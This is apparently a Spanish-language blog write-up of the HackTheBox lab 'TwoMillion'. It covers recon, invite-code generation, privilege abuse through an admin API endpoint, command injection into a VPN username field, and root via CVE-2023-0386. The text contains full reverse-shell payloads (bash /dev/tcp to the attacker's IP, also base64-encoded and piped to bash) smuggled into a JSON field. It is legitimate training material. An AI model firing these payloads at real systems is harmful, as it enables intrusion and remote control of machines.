---
title:  "TwoMillion - HTB"
header:
  teaser:
categories: 
  - CTFs
tags:
  - HTB
---

**TwoMillion** es una máquina de [HackTheBox](https://www.hackthebox.com/) de nivel facil. Se nos presenta una versión antigua de la web de HTB, la cual tiene una API de la que podremos abusar para registrarnos y conseguir ser un usuario administrador. Al tener una cuenta admin, tenemos acceso a un endpoint vulnerable a RCE con el que ganaremos acceso al sistema. Una vez dentro, nos encontraremos con un CVE que deberemos explotar para escalar privilegios.

## Reconocimiento

Comienzo lanzando un ping para comprobar si la máquina se encuentra activa y es accesible.

```shell
ping -c 1 10.10.11.221                                                                                                                  
PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data.
64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=44.5 ms

--- 10.10.11.221 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.513/44.513/44.513/0.000 ms
```

Hago un nmap para ver qué puertos se encuentran abiertos. Uso los siguientes parámetros: 

- -p-: Escanear todos los puertos (65535).
- –open: Mostrar solo los puertos abiertos.
- -sS: Realiza un TCP SYN Scan para escanear rápidamente qué puertos están abiertos.
- –min-rate 5000: Indicamos que el escaneo no vaya más lento que 5000 paquetes por segundo.
- -vvv: El modo verbose nos muestra la información según se va encontrando.
- -n: No realizar resolución de DNS. Así evitamos que el escaneo dure más tiempo del necesario.
- -Pn: Deshabilitar el descubrimiento de host mediante ping.
- -oG: Exportar el resultado a un fichero en una sola línea para que podamos usar comandos como: grep, awk, sed, etc. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.221 -oG allports                                                          
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 10:28 EDT
Initiating SYN Stealth Scan at 10:28
Scanning 10.10.11.221 [65535 ports]
Discovered open port 22/tcp on 10.10.11.221
Discovered open port 80/tcp on 10.10.11.221
Completed SYN Stealth Scan at 10:28, 13.96s elapsed (65535 total ports)
Nmap scan report for 10.10.11.221
Host is up, received user-set (0.094s latency).
Scanned at 2024-05-22 10:28:40 EDT for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
           Raw packets sent: 69663 (3.065MB) | Rcvd: 65622 (2.625MB)
```

Veo que solo hay dos puertos abiertos: 

- 22 (SSH)
- 80 (HTTP)

Ahora, hago otro nmap para analizar los servicios y versiones de ambos puertos. Utilizo los siguientes parámetros:

- -sCV: Detectar el servicio y aplicar scripts básicos de reconocimiento.
- -p: Indicar los puertos a escanear.
- -oN: Explotar el resultado a un archivo.

```shell
 nmap -sVC -p22,80 10.10.11.221 -oN target                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 10:33 EDT
Nmap scan report for 10.10.11.221
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds
```

Las peticiones HTTP se redirigen hacia "2million.htb", así que lo añado al /etc/hosts.

```shell
nano /etc/hosts

10.10.11.221 2million.htb
```

Uso whatweb para ver más información sobre las tecnologías que utiliza la web.

```shell
whatweb http://2million.htb/   

http://2million.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx
```

Para enumerar directorios, uso la herramienta dirsearch. Le indico que no me muestre varios códigos de estado HTTP.

```shell
dirsearch -u http://2million.htb/ --exclude-status 403,404,500,502,400,401                                             

Target: http://2million.htb/

[10:45:59] Starting: 
[10:46:00] 301 -  162B  - /js  ->  http://2million.htb/js/                  
[10:46:05] 200 -    2KB - /404                                              
[10:46:18] 301 -  162B  - /assets  ->  http://2million.htb/assets/          
[10:46:22] 301 -  162B  - /css  ->  http://2million.htb/css/                
[10:46:26] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/            
[10:46:27] 302 -    0B  - /home  ->  /                                      
[10:46:28] 301 -  162B  - /images  ->  http://2million.htb/images/          
[10:46:31] 200 -    4KB - /login                                            
[10:46:31] 302 -    0B  - /logout  ->  /                                    
[10:46:40] 200 -    4KB - /register                                         
[10:46:49] 301 -  162B  - /views  ->  http://2million.htb/views/            
Task Completed
```

Accedo a la web.

![twomillion 1](/assets/images/2024-05-23-twomillion/twomillion_1.png)

## Análisis de vulnerabilidades

Paso un rato investigando la web hasta que doy con un enlace que lleva una ruta donde puedes introducir un código de invitación. Haciendo un curl de http://2million.htb/invite veo como se está haciendo un POST a /api/v1/invite/verify.

```shell
curl http://2million.htb/invite   

<!-- scripts -->
    <script src="/js/htb-frontend.min.js"></script>
    <script defer src="/js/inviteapi.min.js"></script>
    <script defer>
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
    </script>
```

Hago varias pruebas con la api pero no consigo nada.

```shell
curl http://2million.htb/api/v1/invite                           

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>

curl http://2million.htb/api/v1/invite/verify 

curl http://2million.htb/api/v1/users                               

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx</center>
</body>
</html>

```

Leyendo de nuevo el script, veo que se está usando el archivo "/js/inviteapi.min.js". Parece ser que el código está ofuscado.

![twomillion 2](/assets/images/2024-05-23-twomillion/twomillion_2.png)

Utilizo la herramienta [de4js](https://lelinhtinh.github.io/de4js/) para desofucar el JavaScript. Veo que hay una función que hace un POST a "/api/v1/invite/how/to/generate".

![twomillion 3](/assets/images/2024-05-23-twomillion/twomillion_3.png)

## Explotación de vulnerabilidades

Con curl, envío un POST para ver que me devuelve.

```shell
curl -X POST http://2million.htb/api/v1/invite/how/to/generate                                          
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}%
``` 

En la pista, se indica que el texto está encriptado y que debería mirar con que se está cifrando. Observando bien el texto, aparece "enctype":"ROT13". Si vamos a [CyberChef](https://gchq.github.io/CyberChef/) y usamos el encriptado ROT13, podemos descifrar el texto.

![twomillion 4](/assets/images/2024-05-23-twomillion/twomillion_4.png)

***"In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate"***

Texto comenta que para generar un nuevo código de invitación, debo hacer un POST a "/api/v1/invite/generate". Lanzo la petición con curl y obtengo el código. 

```shell
curl -X POST http://2million.htb/api/v1/invite/generate                                                                                 
{"0":200,"success":1,"data":{"code":"UUk1UUQtNlpLU0EtRkdOV1QtT1U4NlA=","format":"encoded"}}% 
```

Al parecer la cadena está codificada en base64 porque tiene un símbolo de "=" al final. Pruebo a decodificarla.

```shell
echo "UUk1UUQtNlpLU0EtRkdOV1QtT1U4NlA=" | base64 -d                                                                                     
QI5QD-6ZKSA-FGNWT-OU86P
```

Ahora que tengo la invitación, puedo registrarme en la web.

![twomillion 6](/assets/images/2024-05-23-twomillion/twomillion_6.png)

Consigo hacer login.

![twomillion 7](/assets/images/2024-05-23-twomillion/twomillion_7.png)

Investigando solo consigo acceder a la sección "Access", el resto estña deshabilitado. No consigo ver nada interesante.

Ahora que estoy autenticado, utilizo BurpSuite para ver si la api devuelve otros datos. Compruebo que efectivamente es así.

![twomillion 8](/assets/images/2024-05-23-twomillion/twomillion_8.png)

![twomillion 9](/assets/images/2024-05-23-twomillion/twomillion_9.png)

Aparentemente, es posible generar una VPN para un usuario en concreto, pero cuando envío una petición dice que no tengo permiso.

```shell
"POST":{
"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"
},
```

También me llama la atención otro endpoint que sirve para actualizar los datos del usuario.

```shell
"PUT":{
"\/api\/v1\/admin\/settings\/update":"Update user settings"
}
```

Al enviar una petición a "/api/v1/admin/settings/update" no obtengo ningún código de error, por lo que puedo tratar de manipular los datos. La web me ha indicado que el content type es inválido, esto probablemente sea debido a que no he usado json: `Content-Type:application/json`.

Cuando vuelvo a enviarla, me dice que es necesario el parámetro email. Si le paso un email, indica que también es necesario pasarle `is_admin`.

![twomillion 10](/assets/images/2024-05-23-twomillion/twomillion_10.png)

Cuando envío el parámetro vacío, me avisa de que necesita de un 0 o un 1.

```
{
  "email":"kh4ndr4@htb.com",
  "is_admin": 1
}
```

Supongo que el 1 será para indicar que si es admin. Envío la petición y en los datos que devuelve aparece  `"is_admin": 1`. Da la impresión de que ahora mi usuario se ha actualizado y es administrador.

![twomillion 11](/assets/images/2024-05-23-twomillion/twomillion_11.png)

Lo compruebo con "/api/v1/admin/auth". Efectivamente ahora mi cuenta tiene permisos de admin.

![twomillion 12](/assets/images/2024-05-23-twomillion/twomillion_12.png)

Antes, no había podido generar una VPN como admin por no tener permiso, así que vuelvo a intentarlo ahora. Al enviar la solicitud a "/api/v1/admin/vpn/generate", me avisa de que falta el parámetro `username`.

![twomillion 13](/assets/images/2024-05-23-twomillion/twomillion_13.png)

Veo como se ha generado el certificado para mi usuario. Para crear esta configuración de VPN es muy probable que se estén ejecutando comandos en el servidor, por lo que es posible que sea vulnerable a RCE. 

Pruebo a concatenar un `whoami` después del nombre de usuario. Compruebo como se ha ejecutado correctamente. 

![twomillion 14](/assets/images/2024-05-23-twomillion/twomillion_14.png)

Me pongo en escucha con netcat e intento establecer una reverse shell. Inyecto el payload, envió la petición y… No funciona.

```shell
{
"username":"kh4ndr4; bash -i >%26 /dev/tcp/10.10.14.132/4321 0>%261;"
}
```

Tras hacer varias pruebas, consigo establecer la conexión pasando a base64 el payload.

```shell
echo "bash -i >& /dev/tcp/10.10.14.132/4321 0>&1" | base64 

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzIvNDMyMSAwPiYx
```

```shell
{
"username":"kh4ndr4; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzIvNDMyMSAwPiYx | base64 -d | bash;"
}
```

Consigo acceso a la máquina TwoMillion como el usuario "www-data".

```shell
nc -lvnp 4321         

listening on [any] 4321 ...
connect to [10.10.14.132] from (UNKNOWN) [10.10.11.221] 36086
bash: cannot set terminal process group (1159): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ whoami
www-data
```

Para tener una consola interactiva  y que por ejemplo detecte un ctrl.c hay que hacer un tratamiento de la tty. Ejecuto `script /dev/null -c bash`, hago ***ctrl+z***, escribo ***"stty raw -echo; fg"***, introduzco ***"reset xterm"*** y doy un ***intro***. Con esto he reiniciado la configuración de la terminal.

```shell
www-data@2million:~/html$
```

La shell todavía no es interactiva del todo. Podemos ver que la variable de entorno $TERM tiene el valor dump y no xterm. 

```shell
www-data@2million:~/html$ echo $TERM
dumb
www-data@2million:~/html$ export TERM=xterm
```

La proporción de la consola no es igual a la de terminal. Miro el tamaño con `stty size`.

```shell
www-data@2million:~/html$ stty size
24 80
```

En la máquina hay 24 filas y 80 columnas, pero en mi kali son 63 filas y 281 columnas. Las modifico para que tengan el mismo espacio.

```shell
www-data@2million:~/html$ stty rows 63 columns 281
```

## Escalada de privilegios

Comienzo revisando si estoy dentro de algún grupo.

```shell
www-data@2million:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Busco la flag del usuario pero no la encuentro en el directorio de mi usuario actual. Busco dentro de la carpeta home y encuentro una carpeta llamada "admin". Dentro está la primera flag, pero no tengo permisos para leerla.

```shell
www-data@2million:/home/admin$ ls
CVE-2023-0386  cve.zip  user.txt
www-data@2million:/home/admin$ cat user.txt 
cat: user.txt: Permission denied
```

Tambien veo un directorio interesante llamado "CVE-2023-0386".

```shell
www-data@2million:/home/admin$ ls -la
total 504
drwxr-xr-x 5 admin admin   4096 May 23 09:36 .
drwxr-xr-x 3 root  root    4096 Jun  6  2023 ..
lrwxrwxrwx 1 root  root       9 May 26  2023 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin    220 May 26  2023 .bash_logout
-rw-r--r-- 1 admin admin   3771 May 26  2023 .bashrc
drwx------ 2 admin admin   4096 Jun  6  2023 .cache
-rw------- 1 admin admin     20 May 23 08:53 .lesshst
-rw-r--r-- 1 admin admin    807 May 26  2023 .profile
drwx------ 2 admin admin   4096 Jun  6  2023 .ssh
drwxr-xr-x 5 admin admin   4096 May 23 09:39 CVE-2023-0386
-rw-rw-r-- 1 admin admin 471222 May 23 09:34 cve.zip
-rw-r----- 1 root  admin     33 May 23 04:01 user.txt
```

```shell
www-data@2million:/home/admin$ ls CVE-2023-0386/
Makefile  README.md  exp  exp.c  fuse  fuse.c  gc  getshell.c  ovlcap  test
```

Investigando cuál es el funcionamiento del CVE, veo que hacen falta los terminales para explotarlo. Con netcat hago otra resverse shell pero esta vez por el puerto 4444.

En la primera consola, ejecuto `./fuse ./ovlcap/lower ./gc` y después, en la segunda introduzco `./exp`. El exploit se realiza correctamente y consigo ser root.

```shell
www-data@2million:/home/admin/CVE-2023-0386$ ./exp
exp: mkdir ./ovlcap/lower: Permission denied
[+] exploit success!
root@2million:/home/admin/CVE-2023-0386# whoami
root
```

Leo la flag del usuario.

```shell
root@2million:/home/admin# cat user.txt 
29***********************85
```

Tambien consigo leer la flag de root.

```shell
root@2million:/root# cat root.txt 
c3***********************28
```
